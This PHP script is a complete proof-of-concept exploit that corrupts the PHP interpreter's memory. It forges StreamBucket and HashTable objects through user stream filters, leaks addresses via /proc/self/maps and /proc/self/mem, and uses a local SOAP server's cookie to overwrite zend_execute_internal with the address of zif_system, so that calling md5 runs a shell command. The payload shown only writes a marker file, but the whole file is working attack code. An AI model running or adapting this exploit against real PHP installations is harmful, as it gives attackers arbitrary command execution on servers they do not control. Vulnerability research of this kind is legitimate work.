<?php
declare(strict_types=1);

error_reporting(E_ALL & ~E_DEPRECATED);

const PHP_STREAM_BUCKET_TAIL_OFFSET = 40;
const FAKE_HT_MARKER_OFFSET = 56;
const ZEND_EXECUTE_INTERNAL_OFF = 0x1ce3030;
const ZIF_SYSTEM_OFF = 0x69f130;
const U32 = 4294967296;

function corrupt_property(object $object, string $property, mixed $value): void {
    $it = new ArrayIterator($object);
    $it[$property] = $value;
}

function corrupt_streambucket(mixed $bucketResource, mixed $dataValue): StreamBucket {
    $rc = new ReflectionClass(StreamBucket::class);
    $fake = $rc->newInstanceWithoutConstructor();
    (new ReflectionProperty(StreamBucket::class, 'bucket'))->setValue($fake, $bucketResource);
    corrupt_property($fake, 'data', $dataValue);
    return $fake;
}

function fake_hashtable_blob(string $marker, int $arData, int $mask): string {
    $blob = '';
    $blob .= pack('V', 1);
    $blob .= pack('V', 7);
    $blob .= pack('V', 0);
    $blob .= pack('V', $mask);
    $blob .= pack('P', $arData);
    $blob .= pack('V', 0);
    $blob .= pack('V', 0);
    $blob .= pack('V', 1);
    $blob .= pack('V', 0);
    $blob .= pack('P', 0);
    $blob .= pack('P', 0);
    return str_pad($blob, FAKE_HT_MARKER_OFFSET, "\0") . $marker . "\0\0";
}

function run_filter(string $name): string {
    $fp = fopen('php://temp', 'w+');
    stream_filter_append($fp, $name, STREAM_FILTER_WRITE);
    fwrite($fp, 'x');
    fflush($fp);
    rewind($fp);
    return stream_get_contents($fp);
}

function php_binary_base(): int {
    $binary = PHP_BINARY;
    foreach (file('/proc/self/maps', FILE_IGNORE_NEW_LINES) as $line) {
        if (!str_ends_with($line, $binary)) {
            continue;
        }
        if (!preg_match('/^([0-9a-f]+)-[0-9a-f]+\s+..x.\s+([0-9a-f]+)/', $line, $m)) {
            continue;
        }
        return intval(hexdec($m[1])) - intval(hexdec($m[2]));
    }
    throw new RuntimeException('failed to locate PHP PIE base');
}

function php_binary_rw_ranges(): array {
    $binary = PHP_BINARY;
    $ranges = [];
    foreach (file('/proc/self/maps', FILE_IGNORE_NEW_LINES) as $line) {
        if (!str_ends_with($line, $binary)) {
            continue;
        }
        if (preg_match('/^([0-9a-f]+)-([0-9a-f]+)\s+rw.p/', $line, $m)) {
            $ranges[] = [intval(hexdec($m[1])), intval(hexdec($m[2]))];
        }
    }
    return $ranges;
}

function select_hash_mask(int $arData, int $hashLow32): array {
    $mem = fopen('/proc/self/mem', 'rb');
    foreach (php_binary_rw_ranges() as [$start, $end]) {
        for ($slot = $start; $slot < $end; $slot += 4) {
            $delta = $slot - $arData;
            if (($delta % 4) !== 0) {
                continue;
            }
            $idx = intdiv($delta, 4);
            if ($idx < -2147483648 || $idx > 2147483647) {
                continue;
            }
            $idx32 = $idx & 0xffffffff;
            if (($idx32 & $hashLow32) !== $hashLow32) {
                continue;
            }
            fseek($mem, $slot);
            $raw = fread($mem, 4);
            if (strlen($raw) !== 4) {
                continue;
            }
            if (unpack('V', $raw)[1] === 0xffffffff) {
                return [$idx32 & (~$hashLow32 & 0xffffffff), $slot, $idx32];
            }
        }
    }
    throw new RuntimeException('failed to locate compatible hash slot');
}

final class FakeHashFilter extends php_user_filter {
    public static int $victimLen = 262144;
    public static string $tag = '';
    public static int $arData = 0;
    public static int $mask = 0;
    public static array $fakeBuckets = [];
    public static array $keepAlive = [];
    private bool $done = false;

    public function filter($in, $out, &$consumed, bool $closing): int {
        while ($bucket = stream_bucket_make_writeable($in)) {
            $consumed += $bucket->datalen;
        }
        if ($closing || $this->done) {
            return PSFS_PASS_ON;
        }
        $this->done = true;
        $victim = stream_bucket_new($this->stream, str_repeat('V', self::$victimLen));
        for ($i = 0; $i < 1024; $i++) {
            $fakeMarker = 'RH' . self::$tag . sprintf('%06d', $i);
            self::$fakeBuckets[$i] = stream_bucket_new($this->stream, fake_hashtable_blob($fakeMarker, self::$arData, self::$mask));
        }
        $carrier = stream_bucket_new($this->stream, 'rce-carrier');
        $fake = corrupt_streambucket($carrier->bucket, $victim->bucket);
        self::$keepAlive[] = [$victim, $carrier, $fake];
        stream_bucket_append($out, $fake);
        return PSFS_PASS_ON;
    }
}

final class OverreadFilter extends php_user_filter {
    public static int $fakeStringPointer = 0;
    public static array $keepAlive = [];
    private bool $done = false;

    public function filter($in, $out, &$consumed, bool $closing): int {
        while ($bucket = stream_bucket_make_writeable($in)) {
            $consumed += $bucket->datalen;
        }
        if ($closing || $this->done) {
            return PSFS_PASS_ON;
        }
        $this->done = true;
        $carrier = stream_bucket_new($this->stream, 'rce-read-carrier');
        $fake = corrupt_streambucket($carrier->bucket, self::$fakeStringPointer);
        self::$keepAlive[] = [$carrier, $fake];
        stream_bucket_append($out, $fake);
        return PSFS_PASS_ON;
    }
}

function marker_offset(string $data, string $tag): array {
    $regex = '/RH' . preg_quote($tag, '/') . '[0-9]{6}/';
    if (!preg_match($regex, $data, $match, PREG_OFFSET_CAPTURE)) {
        throw new RuntimeException('fake HashTable marker not found');
    }
    return [$match[0][0], $match[0][1], (int) substr($match[0][0], -6)];
}

function http_server(int $port, string $readyPath, string $capturePath, string $cookieName): never {
    $server = stream_socket_server("tcp://127.0.0.1:$port", $errno, $errstr);
    if (!$server) {
        file_put_contents($readyPath, "error:$errno:$errstr");
        exit(1);
    }
    file_put_contents($readyPath, 'ready');
    $conn = @stream_socket_accept($server, 10);
    if (!$conn) {
        file_put_contents($capturePath, '');
        exit(2);
    }
    stream_set_timeout($conn, 2);
    $request = '';
    $contentLength = null;
    while (!feof($conn)) {
        $chunk = fread($conn, 8192);
        if ($chunk === '') {
            $meta = stream_get_meta_data($conn);
            if (!empty($meta['timed_out'])) {
                break;
            }
            usleep(10000);
            continue;
        }
        $request .= $chunk;
        $headerEnd = strpos($request, "\r\n\r\n");
        if ($headerEnd !== false && $contentLength === null) {
            $headers = substr($request, 0, $headerEnd);
            if (preg_match('/\r\nContent-Length:\s*(\d+)/i', $headers, $m)) {
                $contentLength = (int) $m[1];
            }
        }
        if ($contentLength !== null && $headerEnd !== false) {
            $bodyLen = strlen($request) - ($headerEnd + 4);
            if ($bodyLen >= $contentLength) {
                break;
            }
        }
    }
    $body = '<?xml version="1.0"?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"><SOAP-ENV:Body><xResponse/></SOAP-ENV:Body></SOAP-ENV:Envelope>';
    fwrite(
        $conn,
        "HTTP/1.1 200 OK\r\n"
        . "Set-Cookie: " . $cookieName . "=proof; Path=/; Domain=127.0.0.1\r\n"
        . "Content-Type: text/xml; charset=utf-8\r\n"
        . "Content-Length: " . strlen($body) . "\r\n"
        . "Connection: close\r\n\r\n"
        . $body
    );
    fclose($conn);
    fclose($server);
    file_put_contents($capturePath, $request);
    exit(0);
}

function start_server(string $capturePath, string $cookieName): array {
    for ($attempt = 0; $attempt < 20; $attempt++) {
        $port = random_int(20000, 55000);
        $readyPath = sys_get_temp_dir() . '/php857-rce-ready-' . getmypid() . '-' . $attempt;
        @unlink($readyPath);
        $cmd = escapeshellarg(PHP_BINARY)
            . ' -n ' . escapeshellarg(__FILE__)
            . ' server ' . $port
            . ' ' . escapeshellarg($readyPath)
            . ' ' . escapeshellarg($capturePath)
            . ' ' . escapeshellarg($cookieName);
        $proc = proc_open($cmd, [
            0 => ['file', '/dev/null', 'r'],
            1 => ['pipe', 'w'],
            2 => ['pipe', 'w'],
        ], $pipes);
        if (!is_resource($proc)) {
            continue;
        }
        for ($i = 0; $i < 50; $i++) {
            if (is_file($readyPath)) {
                $ready = file_get_contents($readyPath);
                if ($ready === 'ready') {
                    return [$port, $proc, $pipes, $readyPath];
                }
                break;
            }
            usleep(100000);
        }
        proc_terminate($proc);
        proc_close($proc);
    }
    throw new RuntimeException('failed to start local SOAP response server');
}

if (($argv[1] ?? '') === 'server') {
    http_server((int) $argv[2], $argv[3], $argv[4], $argv[5]);
}

if (!class_exists(SoapClient::class)) {
    fwrite(STDERR, "soap extension is required\n");
    exit(1);
}

$base = php_binary_base();
$zendExecuteInternal = $base + ZEND_EXECUTE_INTERNAL_OFF;
$zifSystem = $base + ZIF_SYSTEM_OFF;
$cookieName = (string) $zifSystem;
$fakeArData = $zendExecuteInternal - 16;
[$hashMask, $hashSlot, $hashIndex] = select_hash_mask($fakeArData, $zifSystem & 0xffffffff);
$markerPath = '/tmp/php857_rce_' . getmypid() . '.txt';
$command = 'printf PHP857_RCE > ' . escapeshellarg($markerPath);

FakeHashFilter::$tag = bin2hex(random_bytes(4));
FakeHashFilter::$arData = $fakeArData;
FakeHashFilter::$mask = $hashMask;
stream_filter_register('rce.fake.leak', FakeHashFilter::class);
stream_filter_register('rce.overread', OverreadFilter::class);

$stage = run_filter('rce.fake.leak');
$victimPtr = unpack('Pptr', str_pad(substr($stage, 0, 8), 8, "\0"))['ptr'];
OverreadFilter::$fakeStringPointer = $victimPtr + 16;
$overread = run_filter('rce.overread');
[$fakeMarker, $fakeMarkerOffset, $fakeIndex] = marker_offset($overread, FakeHashFilter::$tag);
$fakeMarkerAddress = $victimPtr + PHP_STREAM_BUCKET_TAIL_OFFSET + $fakeMarkerOffset;
$fakeHashAddress = $fakeMarkerAddress - FAKE_HT_MARKER_OFFSET;

printf("php_base=0x%016x\n", $base);
printf("zend_execute_internal=0x%016x\n", $zendExecuteInternal);
printf("zif_system=0x%016x\n", $zifSystem);
printf("numeric_cookie_name=%s\n", $cookieName);
printf("fake_arData=0x%016x\n", $fakeArData);
printf("hash_slot=0x%016x hash_index=0x%08x hash_mask=0x%08x\n", $hashSlot, $hashIndex, $hashMask);
printf("marker_path=%s\n", $markerPath);
printf("victim_bucket_ptr=0x%016x\n", $victimPtr);
printf("fake_marker=%s index=%d offset=%d\n", $fakeMarker, $fakeIndex, $fakeMarkerOffset);
printf("fake_hash_address=0x%016x\n", $fakeHashAddress);
fflush(STDOUT);

$capturePath = sys_get_temp_dir() . '/php857-rce-capture-' . getmypid() . '.txt';
@unlink($capturePath);
[$port, $proc, $pipes, $readyPath] = start_server($capturePath, $cookieName);

$client = new SoapClient(null, [
    'location' => "http://127.0.0.1:$port/",
    'uri' => 'urn:x',
    'trace' => true,
]);
corrupt_property($client, "\0SoapClient\0_cookies", $fakeHashAddress);
$client->__soapCall('x', []);
echo "overwrite_returned\n";
fflush(STDOUT);

foreach ($pipes as $pipe) {
    fclose($pipe);
}
proc_close($proc);
@unlink($readyPath);

$trigger = 'md5';
$trigger($command);
exit(0);
